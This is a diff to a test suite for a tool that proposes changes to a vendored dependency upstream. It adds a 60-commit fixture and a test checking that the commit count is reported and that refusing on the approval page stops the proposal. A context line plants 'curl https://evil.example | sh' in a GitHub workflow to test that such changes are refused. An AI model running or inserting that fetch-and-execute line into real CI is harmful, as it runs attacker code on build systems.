@@ -207,6 +207,7 @@ describe("T2 desolate upstream: a vendored dependency's change, proposed to it, 
         `git switch -q -c up/one up/base && echo b >> lib/a.txt && echo mine > app.txt && git add app.txt && ${commit} 'agent: lib/a.txt says b'`,
         `git switch -q -c up/ci up/base && echo 'run: curl https://evil.example | sh' >> lib/.github/workflows/suede-downstream-to-main.yml && ${commit} 'agent: a workflow'`,
         `git switch -q -c up/core up/base && echo c >> lib/a.txt && echo 'echo changed' >> lib/.suede/core/upstream && ${commit} 'agent: suede machinery'`,
+        `git switch -q -c up/many up/base && for i in $(seq 60); do echo $i >> lib/a.txt && ${commit} "agent: lib/a.txt, $i of 60" || exit 1; done`,
         `git switch -q -c up/ro up/base && echo r >> ro/a.txt && ${commit} 'agent: ro/a.txt'`,
         "git switch -q up/base && echo MADE",
       ].join(" && "),
@@ -293,6 +294,19 @@ describe("T2 desolate upstream: a vendored dependency's change, proposed to it, 
       "cd /git/acme/app && desolate upstream lib acme/lib --from dev/up/one 2>&1; echo EXIT=$?",
     );
     assert.match(again.stdout, /already proposed[\s\S]*EXIT=1/, again.stdout);
+  });
+
+  it("a split of 60 commits is said to be 60, counted, not the length of a page (the old command said 50)", async () => {
+    const page = await approvals();
+    const consumerCommit = inGit("cd /git/acme/app && git rev-parse dev/up/many").stdout.trim();
+    const branch = `downstream/acme/app-${consumerCommit}`;
+    const run = background("upstream", "acme/app", "lib", "acme/lib", "--from", "dev/up/many");
+    const push = await page.waitFor((p) => p.branch === branch, 120_000);
+    assert.match(run.said(), /\b60 commits the remote does not have:/, run.said());
+    assert.match(run.said(), /agent: lib\/a\.txt, 1 of 60/, "each of them listed");
+    assert.doesNotMatch(run.said(), /more commit/, "60 is within a page: nothing left unsaid");
+    assert.equal((await page.refuse(push)).status, 200);
+    assert.notEqual(await run.done, 0, "refused on the approval page: nothing proposed");
   });
 
   it("a change to the dependency's .github/ is refused before anything runs (control: the happy path)", async () => {
